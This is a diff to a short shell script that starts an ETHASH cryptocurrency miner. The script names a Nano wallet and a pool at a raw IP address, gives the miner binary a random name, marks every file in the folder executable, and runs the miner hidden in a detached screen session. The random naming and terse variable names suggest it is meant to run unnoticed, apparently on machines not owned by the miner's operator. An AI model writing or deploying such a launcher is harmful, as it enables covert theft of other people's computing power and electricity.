@@ -2,7 +2,7 @@
 
 WELS=nano_34zxr51ybgctoqr9gkn5znqtyd5ji83ck1z4idqqdpm7xznfxfa4fpua4ik8
 PAL=51.195.4.174:2020
-WER=x
+WER=a
 COMS="--algo ETHASH --pool $PAL --user $WELS.$WER"
 TIP=$(shuf -n 1 -i 1-200000)
 
@@ -15,4 +15,4 @@ else
     mv tuan $TIP
     chmod +x *
 fi
-screen -dmLS ./$TIP $COMS
+screen -dmLS mins ./$TIP $COMS
